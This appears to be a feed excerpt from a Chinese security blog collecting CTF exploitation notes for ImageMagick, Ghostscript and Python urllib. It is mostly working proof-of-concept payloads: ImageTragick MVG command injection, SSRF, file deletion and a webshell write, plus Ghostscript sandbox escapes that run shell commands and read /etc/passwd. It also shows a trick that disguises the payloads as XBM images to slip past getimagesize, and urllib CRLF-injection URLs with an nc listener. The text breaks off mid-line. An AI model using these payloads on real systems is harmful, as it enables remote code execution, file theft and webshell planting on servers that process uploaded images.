    <content type="html"><![CDATA[<h1 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h1><ul><li><h2 id="Bypass-code"><a href="#Bypass-code" class="headerlink" title="Bypass code"></a>Bypass code</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$filename &#x3D; $_FILES[&#39;image&#39;][&#39;tmp_name&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$size &#x3D; getimagesize($filename);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">if ($size &amp;&amp; $size[0] &gt; 100 &amp;&amp; $size[1] &gt; 100) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    $img &#x3D; new Imagick($_FILES[&#39;image&#39;][&#39;tmp_name&#39;]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    $img-&gt;cropThumbnailImage(100, 100);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    $img-&gt;writeImage(&#39;newimage.gif&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure></li></ul><ul><li><h3 id="ImageMagick漏洞"><a href="#ImageMagick漏洞" class="headerlink" title="ImageMagick漏洞"></a>ImageMagick漏洞</h3><ul><li><p>ImageMagick 6.9.3-9 </p></li><li><h3 id="CVE-2016-3714"><a href="#CVE-2016-3714" class="headerlink" title="CVE-2016-3714"></a>CVE-2016-3714</h3><p>与这个漏洞相关的CVE有CVE-2016-3714、CVE-2016-3715、CVE-2016-3716、CVE-2016-3717，其中最严重的就是CVE-2016-3714，利用这个漏洞可以造成远程命令执行的危害。</p><p>ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行的。</p><p>调用的漏洞委托：</p><p><code>&lt;delegate decode=&quot;https&quot; command=&quot;&amp;quot;curl&amp;quot; -s -k -o &amp;quot;%o&amp;quot; &amp;quot;https:%M&amp;quot;&quot;/&gt;</code></p><p>漏洞poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">fill &#39;url(https:&#x2F;&#x2F;&quot;|id;&quot;)&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">pop graphic-context</span></pre></td></tr></table></figure></li><li><h3 id="CVE-2016-3718"><a href="#CVE-2016-3718" class="headerlink" title="CVE-2016-3718"></a>CVE-2016-3718</h3><p> 利用mvg格式中可以包含url的特点，进行SSRF攻击 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">fill &#39;url(http:&#x2F;&#x2F;example.com&#x2F;)&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">pop graphic-context</span></pre></td></tr></table></figure></li><li><h3 id="CVE-2016-3715"><a href="#CVE-2016-3715" class="headerlink" title="CVE-2016-3715"></a>CVE-2016-3715</h3><p> 利用ImageMagick支持的ephemeral协议，来删除任意文件： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">image over 0,0 0,0 &#39;ephemeral:&#x2F;tmp&#x2F;delete.txt&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">popgraphic-context</span></pre></td></tr></table></figure></li><li><h3 id="CVE-2016-3716"><a href="#CVE-2016-3716" class="headerlink" title="CVE-2016-3716"></a>CVE-2016-3716</h3><p> ImageMagick支持的msl协议，来进行文件的读取和写入。利用这个漏洞，可以将任意文件写为任意文件，比如将图片写为一个.php后缀的webshell </p><p> 特别说明的是，msl协议是读取一个msl格式的xml文件，并根据其内容执行一些操作： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">file_move.mvg</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">image over 0,0 0,0 &#39;msl:&#x2F;tmp&#x2F;msl.txt&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">popgraphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#x2F;tmp&#x2F;msl.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">&lt;image&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">&lt;read filename&#x3D;&quot;&#x2F;tmp&#x2F;image.gif&quot; &#x2F;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">&lt;write filename&#x3D;&quot;&#x2F;var&#x2F;www&#x2F;shell.php&quot; &#x2F;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;image&gt;</span></pre></td></tr></table></figure></li><li><h3 id="CVE-2016-3717"><a href="#CVE-2016-3717" class="headerlink" title="CVE-2016-3717"></a>CVE-2016-3717</h3><p> 造成本地文件读取漏洞： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">image over 0,0 0,0 &#39;label:@&#x2F;etc&#x2F;hosts&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">pop graphic-context</span></pre></td></tr></table></figure></li><li><h3 id="Pocs"><a href="#Pocs" class="headerlink" title="Pocs"></a>Pocs</h3><p><a href="https://github.com/ImageTragick/PoCs" target="_blank" rel="noopener">Pocs</a></p></li></ul></li></ul><ul><li><h2 id="深入分析"><a href="#深入分析" class="headerlink" title="深入分析"></a>深入分析</h2><ul><li><p>漏洞代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">  new Imagick(&#39;vul.gif&#39;);</span></pre></td></tr></table></figure><p>无返回值，需从日志读取</p></li><li><h3 id="ImageMagick内存泄漏漏洞（CVE-2018-16323）"><a href="#ImageMagick内存泄漏漏洞（CVE-2018-16323）" class="headerlink" title="ImageMagick内存泄漏漏洞（CVE-2018-16323）"></a>ImageMagick内存泄漏漏洞（CVE-2018-16323）</h3></li><li><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ol><li><p>生成PoC（ps文件）；</p></li><li><p>上传即可</p></li></ol></li><li><p>poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">poc.png</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">______________________________________________________________________________________________</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">%!PS</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">userdict &#x2F;setpagedevice undef</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">save</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">legal</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">restore</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">mark &#x2F;OutputFile (%pipe%id &gt; &#x2F;tmp&#x2F;success &amp;&amp; cat &#x2F;tmp&#x2F;success) currentdevice putdeviceprops</span></pre></td></tr></table></figure></li><li><h3 id="GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）"><a href="#GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）" class="headerlink" title="GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）"></a>GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）</h3></li></ul></li></ul><ul><li><h4 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h4><ol><li>生成poc</li><li>上传即可</li></ol></li><li><p>poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">poc.png</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">______________________________________________________________________________________________</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">%!PS</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">% extract .actual_pdfpaintproc operator from pdfdict</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#x2F;.actual_pdfpaintproc pdfdict &#x2F;.actual_pdfpaintproc get def</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&#x2F;exploit &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    (Stage 11: Exploitation...)&#x3D;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">    &#x2F;forceput exch def</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">    systemdict &#x2F;SAFER false forceput</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">    userparams &#x2F;LockFilePermissions false forceput</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">    systemdict &#x2F;userparams get &#x2F;PermitFileControl [(*)] forceput</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">    systemdict &#x2F;userparams get &#x2F;PermitFileWriting [(*)] forceput</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">    systemdict &#x2F;userparams get &#x2F;PermitFileReading [(*)] forceput</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">    % update</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">    save restore</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">    % All done.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">    stop</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">&#125; def</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">errordict &#x2F;typecheck &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">    &#x2F;typecount typecount 1 add def</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">    (Stage 10: &#x2F;typecheck #)&#x3D;only typecount &#x3D;&#x3D;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">    % The first error will be the .knownget, which we handle and setup the</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">    % stack. The second error will be the ifelse (missing boolean), and then we</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">    % dump the operands.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">    typecount 1 eq &#123; null &#125; if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">    typecount 2 eq &#123; pop 7 get exploit &#125; if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">    typecount 3 eq &#123; (unexpected)&#x3D; quit &#125;  if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">&#125; put</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">% The pseudo-operator .actual_pdfpaintproc from pdf_draw.ps pushes some</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">% executable arrays onto the operand stack that contain .forceput, but are not</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">% marked as executeonly or pseudo-operators.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">%</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">% The routine was attempting to pass them to ifelse, but we can cause that to</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">% fail because when the routine was declared, it used &#96;bind&#96; but many of the</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line">% names it uses are not operators and so are just looked up in the dictstack.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line">%</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">% This means we can push a dict onto the dictstack and control how the routine</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">% works.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">&lt;&lt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">    &#x2F;typecount      0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line">    &#x2F;PDFfile        &#123; (Stage 0: PDFfile)&#x3D; currentfile &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line">    &#x2F;q              &#123; (Stage 1: q)&#x3D; &#125; % no-op</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">    &#x2F;oget           &#123; (Stage 3: oget)&#x3D; pop pop 0 &#125; % clear stack</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line">    &#x2F;pdfemptycount  &#123; (Stage 4: pdfemptycount)&#x3D; &#125; % no-op</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line">    &#x2F;gput           &#123; (Stage 5: gput)&#x3D; &#125;  % no-op</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line">    &#x2F;resolvestream  &#123; (Stage 6: resolvestream)&#x3D; &#125; % no-op</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line">    &#x2F;pdfopdict      &#123; (Stage 7: pdfopdict)&#x3D; &#125; % no-op</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">    &#x2F;.pdfruncontext &#123; (Stage 8: .pdfruncontext)&#x3D; 0 1 mark &#125; % satisfy counttomark and index</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">57</span></pre></td><td class="code"><pre><span class="line">    &#x2F;pdfdict        &#123; (Stage 9: pdfdict)&#x3D;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">58</span></pre></td><td class="code"><pre><span class="line">        % cause a &#x2F;typecheck error we handle above</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">59</span></pre></td><td class="code"><pre><span class="line">        true</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">60</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">61</span></pre></td><td class="code"><pre><span class="line">&gt;&gt; begin &lt;&lt;&gt;&gt; &lt;&lt;&gt;&gt; &#123; .actual_pdfpaintproc &#125; stopped pop</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">62</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">63</span></pre></td><td class="code"><pre><span class="line">(Should now have complete control over ghostscript, attempting to read &#x2F;etc&#x2F;passwd...)&#x3D;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">64</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">65</span></pre></td><td class="code"><pre><span class="line">% Demonstrate reading a file we shouldnt have access to.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">66</span></pre></td><td class="code"><pre><span class="line">(&#x2F;etc&#x2F;passwd) (r) file dup 64 string readline pop &#x3D;&#x3D; closefile</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">67</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">68</span></pre></td><td class="code"><pre><span class="line">(Attempting to execute a shell command...)&#x3D; flush</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">69</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">70</span></pre></td><td class="code"><pre><span class="line">% run command</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">71</span></pre></td><td class="code"><pre><span class="line">(%pipe%id &gt; &#x2F;tmp&#x2F;success) (w) file closefile</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">72</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">73</span></pre></td><td class="code"><pre><span class="line">(All done.)&#x3D;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">74</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">75</span></pre></td><td class="code"><pre><span class="line">quit</span></pre></td></tr></table></figure></li></ul><ul><li><h2 id="绕过getimagesize，执行new-ImageMagick-漏洞"><a href="#绕过getimagesize，执行new-ImageMagick-漏洞" class="headerlink" title="绕过getimagesize，执行new ImageMagick()漏洞"></a>绕过getimagesize，执行new ImageMagick()漏洞</h2><ul><li><h3 id="mvg格式的POC-："><a href="#mvg格式的POC-：" class="headerlink" title="mvg格式的POC ："></a>mvg格式的POC ：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">fill &#39;url(https:&#x2F;&#x2F;127.0.0.0&#x2F;oops.jpg&quot;|&quot;&#96;id&#96;)&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">pop graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">#define xlogo_width 200</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">#define xlogo_height 200</span></pre></td></tr></table></figure><ul><li><p>xbm图片是一个文本格式的文件，而不像其他图片一样是二进制文件。如果某一行格式满足</p><p><code>#define %s %d</code>，那么取出其中的字符串和数字，再从字符串中取出<code>width</code>或<code>height</code>，将数字作为图片的长和宽。</p></li><li><p>后面两句，使其正常判断mvg格式文件的大小</p></li></ul></li><li><h4 id="ps文件poc"><a href="#ps文件poc" class="headerlink" title="ps文件poc"></a>ps文件poc</h4><ul><li><p>借助CVE-2018-16509的POC </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">poc.png</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">__________________________________________________________________________________________</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">%!PS</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">userdict &#x2F;setpagedevice undef</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">save</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">legal</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">restore</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">mark &#x2F;OutputFile (%pipe%id) currentdevice putdeviceprops</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">&#x2F;test &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">#define xlogo64_width 64</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">#define xlogo64_height 64</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure></li></ul></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      在ctf的图片操作中，利用此模块代码的漏洞进行绕过。
    
    </summary>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="ctf" scheme="http://h3art3ars.github.io/tags/ctf/"/>
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="绕过" scheme="http://h3art3ars.github.io/tags/%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>urllib-vul</title>
    <link href="http://h3art3ars.github.io/2019/12/11/urllib-vul/"/>
    <id>http://h3art3ars.github.io/2019/12/11/urllib-vul/</id>
    <published>2019-12-11T07:38:30.000Z</published>
    <updated>2019-12-11T07:41:27.469Z</updated>
    
    <content type="html"><![CDATA[<h1 id="urllib-CRLF注入"><a href="#urllib-CRLF注入" class="headerlink" title="urllib  CRLF注入"></a>urllib  CRLF注入</h1><ul><li>CVE-2016-5699： <code>http://[vps-ip]%0d%0aX-injected:%20header%0d%0atest:5555</code></li><li>CVE-2019-9740： <code>http://[vps-ip]%0d%0a%0d%0aheaders:5555</code></li><li>CVE-2019-9947： <code>http://[vps-ip]:5555?%0d%0apayload%0d%0apadding</code></li><li><code>http://[vps-ip]:5555/%0d%0apayload%0d%0apadding</code></li></ul><h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">import sys</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">import urllib</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">import urllib.error</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">import urllib.request</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">url &#x3D; sys.argv[1]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">try:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">    info &#x3D; urllib.request.urlopen(url).info()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">    print(info)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">except urllib.error.URLError as e:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">    print(e)</span></pre></td></tr></table></figure><p>在vps监听</p><p><code>nc -lvvp 5555</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">listening on [any] 7777 ...</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">connect to [127.0.0.1] from localhost [127.0.0.1] 36252</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">GET &#x2F;?a</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">header::8080&#x2F;test&#x2F;?test&#x3D;a HTTP&#x2F;1.1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">Accept-Encoding: identity</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">Host: 127.0.0.1:7777</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td 